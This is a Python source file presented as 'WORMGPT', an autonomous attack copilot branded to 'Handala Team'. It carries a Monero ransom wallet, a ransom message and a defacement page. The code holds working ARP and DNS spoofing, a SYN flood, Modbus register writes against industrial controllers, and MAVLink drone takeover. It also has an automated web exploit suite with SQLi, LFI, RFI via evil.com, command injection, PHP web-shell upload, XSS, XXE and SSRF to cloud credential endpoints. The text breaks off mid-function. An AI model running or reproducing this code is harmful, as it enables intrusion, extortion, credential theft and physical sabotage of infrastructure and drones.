#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
WORMGPT v55.0 - FULL AUTONOMOUS AGENTIC COPILOT (FINAL ALL-IN-ONE)
ALL EXPLOITS | NETWORK ATTACKS | SCADA | DRONES | RANSOMWARE | WEB DASHBOARD
TELEGRAM BOT | HTML REPORT | AUTONOMOUS DEPENDENCY INSTALLER | TERMUX/KALI
FOR LABORATORY USE ONLY – EVERYTHING PERMITTED – NO LIMITS
================================================================================
"""

import os
import sys
import time
import json
import socket
import base64
import subprocess
import random
import re
import threading
import hashlib
import secrets
import shutil
import gc
import ctypes
import string
import tempfile
import signal
import concurrent.futures
import urllib.parse
import sqlite3
import binascii
import queue
import itertools
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote
from typing import Dict, List, Tuple, Optional

# ============================================================================
# AUTONOMOUS DEPENDENCY MANAGER
# ============================================================================

class AutoDependencyInstaller:
    @staticmethod
    def is_termux():
        return os.path.exists("/data/data/com.termux") or "com.termux" in os.getenv("PREFIX", "")

    @staticmethod
    def is_kali():
        return os.path.exists("/etc/kali-release") or "kali" in os.uname().release.lower()

    @staticmethod
    def run_command(cmd, shell=False, capture=True, check=False):
        try:
            if capture:
                result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, timeout=120)
                return result.returncode == 0, result.stdout + result.stderr
            else:
                subprocess.run(cmd, shell=shell, timeout=120, check=check)
                return True, ""
        except Exception as e:
            return False, str(e)

    @staticmethod
    def install_python_package(package):
        print(f"[*] Installing Python package: {package}")
        for pip_cmd in [sys.executable + " -m pip", "pip3", "pip"]:
            success, out = AutoDependencyInstaller.run_command(f"{pip_cmd} install {package}", shell=True)
            if success:
                print(f"[+] Installed {package}")
                return True
        print(f"[!] Failed to install {package}")
        return False

    @staticmethod
    def install_system_package(pkg_name):
        print(f"[*] Installing system package: {pkg_name}")
        if AutoDependencyInstaller.is_termux():
            cmd = f"pkg install -y {pkg_name}"
        elif AutoDependencyInstaller.is_kali():
            cmd = f"sudo apt install -y {pkg_name}"
        else:
            for manager, install_cmd in [("apt", "apt install -y"), ("yum", "yum install -y"), ("pacman", "pacman -S --noconfirm")]:
                if shutil.which(manager):
                    cmd = f"{install_cmd} {pkg_name}"
                    break
            else:
                return False
        success, out = AutoDependencyInstaller.run_command(cmd, shell=True)
        if success:
            print(f"[+] Installed {pkg_name}")
            return True
        print(f"[!] Failed to install {pkg_name}")
        return False

    @staticmethod
    def ensure_python_import(module_name, pip_name=None):
        if pip_name is None:
            pip_name = module_name
        try:
            __import__(module_name)
            return True
        except ImportError:
            print(f"[!] Missing Python module: {module_name}")
            return AutoDependencyInstaller.install_python_package(pip_name)

    @staticmethod
    def ensure_command(cmd_name, install_pkg=None):
        if shutil.which(cmd_name):
            return True
        print(f"[!] Missing command: {cmd_name}")
        if install_pkg:
            return AutoDependencyInstaller.install_system_package(install_pkg)
        return False

    @staticmethod
    def install_all():
        print("\n[🤖 AUTONOMOUS DEPENDENCY CHECKER - WORMGPT COPILOT]\n")
        python_packages = [
            ("requests", "requests"),
            ("flask", "flask"),
            ("colorama", "colorama"),
            ("cryptography", "cryptography"),
            ("pymavlink", "pymavlink"),
            ("pyModbusTCP", "pyModbusTCP"),
            ("nmap", "python-nmap"),
            ("shodan", "shodan"),
            ("boto3", "boto3"),
            ("scapy", "scapy"),
        ]
        for mod, pip in python_packages:
            AutoDependencyInstaller.ensure_python_import(mod, pip)

        system_tools = [
            ("tor", "tor"),
            ("cargo", "rustc"),
            ("rustc", "rustc"),
            ("nikto", "nikto"),
            ("nmap", "nmap"),
            ("arpspoof", "dsniff"),
            ("dsniff", "dsniff"),
            ("tcpdump", "tcpdump"),
            ("bettercap", "bettercap"),
        ]
        for cmd, pkg in system_tools:
            AutoDependencyInstaller.ensure_command(cmd, pkg)

        if not shutil.which("nuclei"):
            print("[*] Installing nuclei...")
            if shutil.which("go"):
                AutoDependencyInstaller.run_command("go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest", shell=True)
            else:
                arch = os.uname().machine
                if "aarch64" in arch or "arm64" in arch:
                    url = "https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_3.3.7_linux_arm64.zip"
                else:
                    url = "https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_3.3.7_linux_amd64.zip"
                AutoDependencyInstaller.run_command(f"wget {url} -O /tmp/nuclei.zip && unzip -o /tmp/nuclei.zip -d /tmp/ && chmod +x /tmp/nuclei && mv /tmp/nuclei /usr/local/bin/", shell=True)
            if shutil.which("nuclei"):
                print("[+] Nuclei installed")

        print("\n[✅] Dependency check complete. Continuing...\n")
        time.sleep(1)

# Run dependency installer immediately
AutoDependencyInstaller.install_all()

# Now import all required modules (they should be present)
import requests
import urllib3
import xml.etree.ElementTree as ET
from colorama import init, Fore, Back, Style
from flask import Flask, render_template_string, request, jsonify

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Optional imports (some may still be missing, but we tried)
try:
    import nmap
    HAS_NMAP = True
except ImportError:
    HAS_NMAP = False
try:
    from nuclei import Nuclei
    HAS_NUCLEI = True
except ImportError:
    HAS_NUCLEI = False
try:
    import nikto
    HAS_NIKTO = True
except ImportError:
    HAS_NIKTO = False
try:
    import boto3
    HAS_BOTO3 = True
except ImportError:
    HAS_BOTO3 = False
try:
    from pymavlink import mavutil
    HAS_MAV = True
except ImportError:
    HAS_MAV = False
try:
    from pyModbusTCP.client import ModbusClient
    HAS_MODBUS = True
except ImportError:
    HAS_MODBUS = False
try:
    from scapy.all import ARP, Ether, srp, send, sniff, IP, TCP, UDP, Raw
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

# ============================================================================
# GLOBAL STATE & CONFIGURATION
# ============================================================================

XMR_WALLET = "8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTuFCkLHtyHnrYNnHycdaGb2Kgkkmw8jViCdB6"
XMR_AMOUNT = "0.5"
CONTACT_EMAIL = "chat@onionmail.org"
CUSTOM_MESSAGE = "⚠️ HANDALA TEAM TOOK OVER YOUR SERVER! ⚠️\nAll data encrypted. Send Monero to recover."

DEFACE_MESSAGE = """<!DOCTYPE html>
<html>
<head><title>Hacked by Handala Team</title>
<style>body{background:black;color:#0f0;font-family:monospace;text-align:center;padding-top:20%;}h1{font-size:4em;text-shadow:0 0 10px #0f0;}</style>
</head>
<body>
<h1>✋ HANDALA TAKEOVER ✋</h1>
<p>This server has been compromised by <span style="color:#f00;">HANDALA TEAM</span> autonomous agent.</p>
<p>Your data is encrypted. Send Monero to recover.</p>
<p>Contact: chat@onionmail.org</p>
</body>
</html>"""

VERSION = "55.0"
WORKSPACE = None
TOR_PROC = None
C2_SERVER = None
RANSOMWARE_BINARY = None
ENCRYPTION_KEY = None
C2_ONION = None
LEAK_SITE = None
SHELL_URL = None
DEFACE_DONE = False
DB_CONN = None
HTML_REPORT = "handala_report.html"
BOT_TOKEN = ""
BOT_CONFIG_FILE = "bot_token.json"

# Flask web app
app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(16)

# Global state for bot commands
current_target = ""
attack_results = {}
bot_running = False
bot_polling_thread = None

# ============================================================================
# VISUAL EFFECTS & UTILITIES
# ============================================================================

def rand_str(n=8):
    return ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    icons = {
        "INFO":"🧠", "SUCCESS":"✅", "ERROR":"❌", "ATTACK":"💀", "C2":"🌐", "RUST":"🦀", "TOR":"🌀",
        "WORM":"😈", "GHOST":"👻", "XMR":"🔶", "SCAN":"📡", "EXPLOIT":"⚔️", "SAVE":"💾", "DEFACE":"🎭",
        "DEHASH":"🔓", "NMAP":"🗺️", "NUCLEI":"💥", "NIKTO":"🛡️", "HIJACK":"🎯", "DB":"🗄️", "S3":"📦",
        "FUZZ":"🔧", "SSRF":"🌐", "POST":"💻", "PERSIST":"🔗", "SQLDUMP":"🗃️", "OSINT":"🔍",
        "MODBUS":"🔌", "DRONE":"🚁", "ARP":"🌍", "DNS":"🌐", "MiTM":"🎭", "EXFIL":"📤"
    }
    color = Fore.WHITE
    if level == "SUCCESS":
        color = Fore.GREEN
    elif level == "ERROR":
        color = Fore.RED
    elif level == "ATTACK":
        color = Fore.RED
    elif level == "WORM":
        color = Fore.MAGENTA
    print(f"{color}[{ts}] {icons.get(level,'📌')} {msg}{Style.RESET_ALL}")

def print_banner():
    banner = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════════════════════════════════╗
║  ✋✋✋ HANDALA TAKEOVER - ULTIMATE AUTONOMOUS COPILOT ✋✋✋                               ║
║  █     █░▓█████  ██▀███   ███▄ ▄███▓▓█████  ██▓███   ▄▄▄█████▓░██████╗ ██╗
║ ▓█░ █ ░█░▓█   ▀ ▓██ ▒ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██░  ██▒▓  ██▒ ▓▒▒██    ▒ ▒██║
║ ▒█░ █ ░█ ▒███   ▓██ ░▄█ ▒▓██    ▓██░▒███   ▓██░ ██▓▒▒ ▓██░ ▒░░ ▓██▄   ░██║
║ ░█░ █ ░█ ▒▓█  ▄ ▒██▀▀█▄  ▒██    ▒██ ▒▓█  ▄ ▒██▄█▓▒ ▒░ ▓██▓ ░   ▒   ██▒░██║
║ ░░██▒██▓ ░▒████▒░██▓ ▒██▒▒██▒   ░██▒░▒████▒▒██▒ ░  ░  ▒██▒ ░ ▒██████▒▒░██║
║ ░ ▓░▒ ▒  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ░  ░░░ ▒░ ░▒▓▒░ ░  ░  ▒ ░░   ▒ ▒▓▒ ▒ ░░▓  ║
║   ▒ ░ ░   ░ ░  ░  ░▒ ░ ▒░░  ░      ░ ░ ░  ░░▒ ░         ░    ░ ░▒  ░ ░ ▒ ░║
║   ░   ░     ░     ░░   ░ ░      ░      ░   ░░         ░ ░    ░  ░  ░   ▒ ░║
║     ░       ░  ░   ░            ░      ░  ░                       ░   ░   ║
║                                                                           ║
║        {Fore.YELLOW}WORMGPT v55.0 - FINAL ALL-IN-ONE EDITION{Fore.RED}                                 ║
║   {Fore.GREEN}WEB UI | TELEGRAM BOT | ALL EXPLOITS | NETWORK | SCADA | DRONES{Fore.RED}             ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def aggressive_animation(attack_name, target):
    print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[💀] LAUNCHING AGGRESSIVE ATTACK: {attack_name}{Style.RESET_ALL}")
    print(f"{Fore.RED}[🎯] TARGET: {target}{Style.RESET_ALL}")
    print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}")
    for i in range(3):
        sys.stdout.write(f"\r{Fore.RED}⚡ EXECUTING {attack_name.upper()} ⚡{' ' * (i+1)}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.3)
    print()

# ============================================================================
# DATABASE
# ============================================================================

def init_db():
    global DB_CONN
    DB_CONN = sqlite3.connect('wormgpt_data.db')
    c = DB_CONN.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
                 (id INTEGER PRIMARY KEY, target TEXT, username TEXT, password TEXT, hash TEXT, cracked TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities
                 (id INTEGER PRIMARY KEY, target TEXT, type TEXT, url TEXT, details TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS admin_logins
                 (id INTEGER PRIMARY KEY, target TEXT, admin_url TEXT, username TEXT, password TEXT, timestamp TEXT)''')
    DB_CONN.commit()
    log("Database initialized", "DB")

def save_credential(target, username, password, hash_val=None, cracked=None):
    c = DB_CONN.cursor()
    c.execute("INSERT INTO credentials (target, username, password, hash, cracked, timestamp) VALUES (?,?,?,?,?,?)",
              (target, username, password, hash_val, cracked, datetime.now().isoformat()))
    DB_CONN.commit()

def save_admin_login(target, admin_url, username, password):
    c = DB_CONN.cursor()
    c.execute("INSERT INTO admin_logins (target, admin_url, username, password, timestamp) VALUES (?,?,?,?,?)",
              (target, admin_url, username, password, datetime.now().isoformat()))
    DB_CONN.commit()

def save_vulnerability(target, vuln_type, url, details):
    c = DB_CONN.cursor()
    c.execute("INSERT INTO vulnerabilities (target, type, url, details, timestamp) VALUES (?,?,?,?,?)",
              (target, vuln_type, url, details, datetime.now().isoformat()))
    DB_CONN.commit()

# ============================================================================
# PAYLOAD DATABASES (ALL EXPLOIT VECTORS)
# ============================================================================

# SQL Injection
SQLI_PAYLOADS = {
    "error_based": ["'", "\"", "')", "1' AND 1=1--", "' OR '1'='1", "' UNION SELECT NULL--"],
    "blind_boolean": ["1' AND 1=1--", "1' AND 1=2--", "' AND '1'='1"],
    "blind_time": ["1' AND SLEEP(5)--", "1' WAITFOR DELAY '0:0:5'--"],
    "union_based": ["1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--", "1' UNION SELECT 1,2,3--"],
    "stacked_queries": ["1'; DROP TABLE users--", "1'; SELECT * FROM users--"],
    "waf_bypass": ["1%27%20OR%20%271%27%3D%271", "1/**/OR/**/1=1--", "1' OR '1'='1'#"]
}

# LFI
LFI_PAYLOADS = {
    "basic": ["../../../../etc/passwd", "../../../etc/passwd", "/etc/passwd", "file:///etc/passwd"],
    "encoded": ["%2e%2e%2f%2e%e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd"],
    "php_filters": ["php://filter/convert.base64-encode/resource=index.php"],
    "proc_self": ["/proc/self/environ", "/proc/self/cmdline"]
}

# RFI
RFI_PAYLOADS = [
    "http://evil.com/shell.txt", "https://evil.com/shell.php", "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4="
]

# Command Injection
CMDI_PAYLOADS = {
    "linux": ["; ls", "| ls", "`ls`", "$(ls)", "; cat /etc/passwd", "| whoami", "&& id"],
    "windows": ["& dir", "| dir", "& whoami", "& type C:\\Windows\\win.ini"],
    "bypass": [";${IFS}ls", "|${IFS}whoami", "&echo${IFS}test"]
}

# File Upload
UPLOAD_PAYLOADS = {
    "php_shells": [
        "<?php system($_GET['c']); ?>", "<?php eval($_POST['cmd']); ?>",
        "<?php echo shell_exec($_GET['c']); ?>", "<?php passthru($_GET['c']); ?>"
    ],
    "bypass_extensions": ["shell.php", "shell.php3", "shell.phtml", "shell.php.jpg", "shell.php%00.jpg"],
    "bypass_mime": ["image/jpeg", "image/png", "application/octet-stream"]
}

# XSS
XSS_PAYLOADS = {
    "reflected": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
    "stored": ["<script>alert(document.cookie)</script>"],
    "bypass": ["<ScRiPt>alert(1)</ScRiPt>", "<img/src=x/onerror=alert(1)>"]
}

# XXE
XXE_PAYLOADS = [
    '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>''',
    '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&xxe;</root>'''
]

# SSRF
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://127.0.0.1:80/admin",
    "file:///etc/passwd"
]

# Deserialization
DESER_PAYLOADS = ["rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ", "O:8:\"stdClass\":0:{}"]
# SSTI
SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "{{7*'7'}}", "<%= 7*7 %>", "{{config}}"]
# Header Injection
HEADER_PAYLOADS = [("X-Forwarded-For","127.0.0.1"),("X-Admin","true"),("X-Administrator","true"),("X-User-Role","admin"),("X-Sudo","true")]
# CRLF
CRLF_PAYLOADS = ["test%0d%0aSet-Cookie: session=injected", "test%0aSet-Cookie: session=injected"]
# Open Redirect
OPEN_REDIRECT_PAYLOADS = ["//evil.com", "https://evil.com", "javascript:alert(1)"]

# Dynamic payloads
def generate_dynamic_payloads(base, encodings=["url","double_url","hex","unicode"]):
    new = []
    for p in base:
        new.append(p)
        if "url" in encodings:
            new.append(quote(p))
        if "double_url" in encodings:
            new.append(quote(quote(p)))
        if "hex" in encodings:
            new.append(''.join(f'%{ord(c):02x}' for c in p))
        if "unicode" in encodings:
            new.append(''.join(f'\\u{ord(c):04x}' for c in p))
    return list(set(new))

DYNAMIC_SQLI = generate_dynamic_payloads(SQLI_PAYLOADS["error_based"], ["url","hex"])
DYNAMIC_LFI = generate_dynamic_payloads(LFI_PAYLOADS["basic"], ["url","double_url"])
DYNAMIC_CMDI = generate_dynamic_payloads(CMDI_PAYLOADS["linux"], ["url"])
DYNAMIC_XSS = generate_dynamic_payloads(XSS_PAYLOADS["reflected"], ["url","hex"])

# ============================================================================
# REAL ATTACK TOOLS (NMAP, NUCLEI, NIKTO, SHODAN)
# ============================================================================

def real_nmap_scan(target):
    aggressive_animation("NMAP SCAN", target)
    log(f"Running REAL nmap scan on {target}", "NMAP")
    if not HAS_NMAP:
        log("nmap module not installed", "ERROR")
        return {}
    nm = nmap.PortScanner()
    try:
        nm.scan(target, arguments='-sV -sC -T4 --top-ports 1000')
        results = {}
        for host in nm.all_hosts():
            results[host] = {}
            for proto in nm[host].all_protocols():
                ports = nm[host][proto].keys()
                results[host][proto] = {port: nm[host][proto][port] for port in ports}
        log(f"Nmap scan completed, found {len(results)} hosts", "SUCCESS")
        return results
    except Exception as e:
        log(f"nmap error: {e}", "ERROR")
        return {}

def real_nuclei_scan(target):
    aggressive_animation("NUCLEI SCAN", target)
    log(f"Running REAL nuclei scan on {target}", "NUCLEI")
    if not HAS_NUCLEI:
        log("nuclei module not installed", "ERROR")
        return []
    try:
        nuclei = Nuclei(templates_dir="~/nuclei-templates", silent=True)
        results = nuclei.scan(target, tags=["cve", "critical", "high"])
        findings = [r.get("info", {}).get("name", "Unknown") for r in results]
        log(f"Nuclei scan completed, found {len(findings)} findings", "SUCCESS")
        return findings
    except Exception as e:
        log(f"Nuclei error: {e}", "ERROR")
        return []

def real_nikto_scan(target):
    aggressive_animation("NIKTO SCAN", target)
    log(f"Running REAL nikto scan on {target}", "NIKTO")
    if not shutil.which("nikto"):
        log("Nikto not installed", "ERROR")
        return []
    try:
        cmd = ["nikto", "-h", target, "-Format", "json", "-output", "/tmp/nikto_out.json"]
        subprocess.run(cmd, timeout=300, capture_output=True)
        with open("/tmp/nikto_out.json", "r") as f:
            data = json.load(f)
        findings = [item.get("msg", "") for item in data.get("vulnerabilities", [])]
        os.remove("/tmp/nikto_out.json")
        log(f"Nikto scan completed, found {len(findings)} issues", "SUCCESS")
        return findings
    except Exception as e:
        log(f"Nikto error: {e}", "ERROR")
        return []

def real_shodan_osint(domain):
    aggressive_animation("SHODAN OSINT", domain)
    log(f"Running REAL Shodan OSINT for {domain}", "OSINT")
    if not SHODAN_API_KEY:
        log("Shodan API key not set", "ERROR")
        return []
    try:
        import shodan
        api = shodan.Shodan(SHODAN_API_KEY)
        results = api.search(f"hostname:{domain}")
        ips = [result['ip_str'] for result in results['matches']]
        log(f"Shodan found {len(ips)} IPs", "SUCCESS")
        return ips
    except Exception as e:
        log(f"Shodan error: {e}", "ERROR")
        return []

# ============================================================================
# NETWORK ATTACKS (ARP SPOOF, DNS SPOOF, SYN FLOOD)
# ============================================================================

class NetworkAttacks:
    @staticmethod
    def arp_spoof(target_ip, gateway_ip, interface="eth0"):
        aggressive_animation("ARP SPOOFING", f"{target_ip} (gateway: {gateway_ip})")
        log(f"Launching ARP spoofing", "ARP")
        if not HAS_SCAPY:
            log("Scapy not installed", "ERROR")
            return False
        try:
            from scapy.all import ARP, send
            pkt_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip)
            pkt_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip)
            def _spoof():
                while True:
                    send(pkt_target, verbose=False)
                    send(pkt_gateway, verbose=False)
                    time.sleep(2)
            t = threading.Thread(target=_spoof, daemon=True)
            t.start()
            log("ARP spoofing started", "SUCCESS")
            return True
        except Exception as e:
            log(f"ARP spoof failed: {e}", "ERROR")
            return False

    @staticmethod
    def dns_spoof(target_ip, domain_to_spoof, spoof_ip, interface="eth0"):
        aggressive_animation("DNS SPOOFING", f"{domain_to_spoof} -> {spoof_ip}")
        log(f"DNS spoofing", "DNS")
        if not HAS_SCAPY:
            log("Scapy not installed", "ERROR")
            return False
        try:
            from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff
            def _dns_reply(pkt):
                if pkt.haslayer(DNSQR) and pkt[DNSQR].qname.decode().rstrip('.') == domain_to_spoof:
                    ip_response = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                    udp_response = UDP(dport=pkt[UDP].sport, sport=53)
                    dns_response = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                       an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoof_ip))
                    send(ip_response/udp_response/dns_response, verbose=False)
                    log(f"DNS spoofed", "SUCCESS")
            sniff(filter=f"udp port 53 and host {target_ip}", prn=_dns_reply, store=0, timeout=60)
            return True
        except Exception as e:
            log(f"DNS spoof failed: {e}", "ERROR")
            return False

    @staticmethod
    def syn_flood(target_ip, target_port=80, count=1000):
        aggressive_animation("SYN FLOOD", f"{target_ip}:{target_port} ({count} packets)")
        log(f"SYN flood", "ATTACK")
        if not HAS_SCAPY:
            log("Scapy not installed", "ERROR")
            return False
        try:
            from scapy.all import IP, TCP, send
            ip = IP(dst=target_ip)
            for i in range(count):
                tcp = TCP(sport=random.randint(1024,65535), dport=target_port, flags='S', seq=random.randint(0,4294967295))
                send(ip/tcp, verbose=False)
                if i % 100 == 0:
                    log(f"SYN flood: {i+1}/{count} packets sent", "INFO")
            log("SYN flood completed", "SUCCESS")
            return True
        except Exception as e:
            log(f"SYN flood failed: {e}", "ERROR")
            return False

# ============================================================================
# SCADA MODBUS EXPLOITATION
# ============================================================================

class ModbusExploitation:
    @staticmethod
    def scan_modbus(ip, port=502):
        aggressive_animation("MODBUS SCAN", f"{ip}:{port}")
        log(f"Scanning Modbus device", "MODBUS")
        if not HAS_MODBUS:
            log("pyModbusTCP not installed", "ERROR")
            return None
        client = ModbusClient(host=ip, port=port, auto_open=True, timeout=5)
        if not client.is_open:
            client.open()
        try:
            regs = client.read_holding_registers(0, 10)
            if regs:
                log(f"Read registers: {regs}", "SUCCESS")
                return regs
        except:
            pass
        try:
            coils = client.read_coils(0, 10)
            if coils:
                log(f"Read coils: {coils}", "SUCCESS")
                return coils
        except:
            pass
        client.close()
        return None

    @staticmethod
    def write_register(ip, address, value, port=502):
        aggressive_animation("MODBUS WRITE", f"{ip}:{address}={value}")
        log(f"Writing register", "MODBUS")
        if not HAS_MODBUS:
            return False
        client = ModbusClient(host=ip, port=port, auto_open=True)
        client.open()
        success = client.write_single_register(address, value)
        client.close()
        return success

    @staticmethod
    def critical_attack(ip, port=502):
        aggressive_animation("CRITICAL MODBUS ATTACK", ip)
        ModbusExploitation.write_register(ip, 40001, 0, port)
        ModbusExploitation.write_register(ip, 40002, 9999, port)
        return True

# ============================================================================
# DRONE TAKEOVER (MAVLink)
# ============================================================================

class DroneExploitation:
    @staticmethod
    def full_takeover(ip, port=14550, altitude=50):
        aggressive_animation("DRONE TAKEOVER", ip)
        log(f"Connecting to drone", "DRONE")
        if not HAS_MAV:
            log("pymavlink not installed", "ERROR")
            return False
        try:
            master = mavutil.mavlink_connection(f"udp:{ip}:{port}")
            master.wait_heartbeat()
            master.mav.command_long_send(master.target_system, master.target_component,
                                         mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0,0,0,0,0,0)
            time.sleep(1)
            master.mav.command_long_send(master.target_system, master.target_component,
                                         mavutil.mavlink.MAV_CMD_NAV_TAKEOFF, 0, 0,0,0,0,0,0, altitude)
            log("Drone taken over", "SUCCESS")
            return True
        except Exception as e:
            log(f"Drone takeover failed: {e}", "ERROR")
            return False

# ============================================================================
# WEB EXPLOIT SUITE (SQLi, LFI, RFI, CMDi, XSS, XXE, SSRF, Deser, SSTI, Header, CRLF, Upload, Default Creds)
# ============================================================================

class WebExploitSuite:
    def __init__(self, target, session):
        self.target = target.rstrip('/')
        self.session = session
        self.vulns = []
        self.shell_url = None
        self.admin_creds = []

    def test_sql_injection(self):
        aggressive_animation("SQL INJECTION", self.target)
        for category, payloads in SQLI_PAYLOADS.items():
            for payload in payloads:
                for param in ["id","page","cat","product","user","q"]:
                    url = self.target + f"/?{param}={quote(payload)}"
                    try:
                        resp = self.session.get(url, timeout=5)
                        if any(x in resp.text.lower() for x in ["mysql","sql syntax","mysql_fetch","sqlite","postgresql"]):
                            self.vulns.append({"type":"sql_injection","category":category})
                            log(f"SQLi found: {param} -> {payload[:30]}", "SUCCESS")
                            save_vulnerability(self.target, f"sql_injection_{category}", url, payload)
                            return True
                    except:
                        pass
        for payload in DYNAMIC_SQLI:
            for param in ["id","page","cat"]:
                url = self.target + f"/?{param}={payload}"
                try:
                    resp = self.session.get(url, timeout=5)
                    if "mysql" in resp.text.lower() or "sql" in resp.text.lower():
                        self.vulns.append({"type":"sql_injection","payload":payload})
                        log(f"SQLi found (dynamic)", "SUCCESS")
                        return True
                except:
                    pass
        return False

    def test_lfi(self):
        aggressive_animation("LOCAL FILE INCLUSION", self.target)
        for category, payloads in LFI_PAYLOADS.items():
            for payload in payloads:
                for param in ["file","page","view","include","doc","load","read","path"]:
                    url = self.target + f"/?{param}={quote(payload)}"
                    try:
                        resp = self.session.get(url, timeout=5)
                        if "root:" in resp.text or "bin:" in resp.text or "[extensions]" in resp.text:
                            self.vulns.append({"type":"lfi","category":category})
                            log(f"LFI found: {param} -> {payload[:30]}", "SUCCESS")
                            save_vulnerability(self.target, f"lfi_{category}", url, payload)
                            return True
                    except:
                        pass
        for payload in DYNAMIC_LFI:
            for param in ["file","page","include"]:
                url = self.target + f"/?{param}={payload}"
                try:
                    resp = self.session.get(url, timeout=5)
                    if "root:" in resp.text:
                        self.vulns.append({"type":"lfi","payload":payload})
                        log(f"LFI found (dynamic)", "SUCCESS")
                        return True
                except:
                    pass
        return False

    def test_rfi(self):
        aggressive_animation("REMOTE FILE INCLUSION", self.target)
        for payload in RFI_PAYLOADS:
            for param in ["file","page","include","load","template"]:
                url = self.target + f"/?{param}={quote(payload)}"
                try:
                    resp = self.session.get(url, timeout=5)
                    if "evil.com" in resp.text or "shell" in resp.text:
                        self.vulns.append({"type":"rfi"})
                        log(f"RFI found: {param} -> {payload[:30]}", "SUCCESS")
                        save_vulnerability(self.target, "rfi", url, payload)
                        return True
                except:
                    pass
        return False

    def test_command_injection(self):
        aggressive_animation("COMMAND INJECTION", self.target)
        for os_type, payloads in CMDI_PAYLOADS.items():
            for payload in payloads:
                for param in ["cmd","exec","command","run","ping","host","ip","system"]:
                    url = self.target + f"/?{param}={quote(payload)}"
                    try:
                        resp = self.session.get(url, timeout=5)
                        if any(x in resp.text for x in ["bin","home","root","Desktop","usr","var","etc","Windows"]):
                            self.vulns.append({"type":"cmd_injection","os":os_type})
                            log(f"CMDi found: {param} -> {payload[:30]}", "SUCCESS")
                            save_vulnerability(self.target, f"cmd_injection_{os_type}", url, payload)
                            return True
                    except:
                        pass
        for payload in DYNAMIC_CMDI:
            for param in ["cmd","exec"]:
                url = self.target + f"/?{param}={payload}"
                try:
                    resp = self.session.get(url, timeout=5)
                    if "bin" in resp.text or "home" in resp.text:
                        self.vulns.append({"type":"cmd_injection","payload":payload})
                        log(f"CMDi found (dynamic)", "SUCCESS")
                        return True
                except:
                    pass
        return False

    def test_file_upload(self):
        aggressive_animation("FILE UPLOAD", self.target)
        for shell in UPLOAD_PAYLOADS["php_shells"]:
            for ext in UPLOAD_PAYLOADS["bypass_extensions"]:
                for path in ["/upload","/uploads","/admin/upload","/api/upload","/filemanager/upload"]:
                    url = self.target + path
                    files = {'file': (ext, shell, 'application/x-php')}
                    try:
                        resp = self.session.post(url, files=files, timeout=5)
                        if resp.status_code in [200,201,302]:
                            test_urls = [self.target + "/uploads/"+ext, self.target + "/files/"+ext, self.target + "/"+ext]
                            for test_url in test_urls:
                                test_resp = self.session.get(test_url + "?c=echo%20HANDALA_SHELL", timeout=5)
                                if "HANDALA_SHELL" in test_resp.text:
                                    self.shell_url = test_url
                                    self.vulns.append({"type":"file_upload"})
                                    log(f"Shell uploaded: {test_url}", "SUCCESS")
                                    save_vulnerability(self.target, "file_upload", test_url, ext)
                                    return True
                    except:
                        pass
        return False

    def test_xss(self):
        aggressive_animation("XSS", self.target)
        for category, payloads in XSS_PAYLOADS.items():
            for payload in payloads:
                for param in ["q","search","s","query","keyword","name","id","page"]:
                    url = self.target + f"/?{param}={quote(payload)}"
                    try:
                        resp = self.session.get(url, timeout=5)
                        if payload in resp.text:
                            self.vulns.append({"type":"xss","category":category})
                            log(f"XSS found: {param} -> {payload[:30]}", "SUCCESS")
                            save_vulnerability(self.target, f"xss_{category}", url, payload)
                            return True
                    except:
                        pass
        for payload in DYNAMIC_XSS:
            for param in ["q","search"]:
                url = self.target + f"/?{param}={payload}"
                try:
                    resp = self.session.get(url, timeout=5)
                    if "alert" in resp.text or "script" in resp.text:
                        self.vulns.append({"type":"xss","payload":payload})
                        log(f"XSS found (dynamic)", "SUCCESS")
                        return True
                except:
                    pass
        return False

    def test_xxe(self):
        aggressive_animation("XXE", self.target)
        for payload in XXE_PAYLOADS:
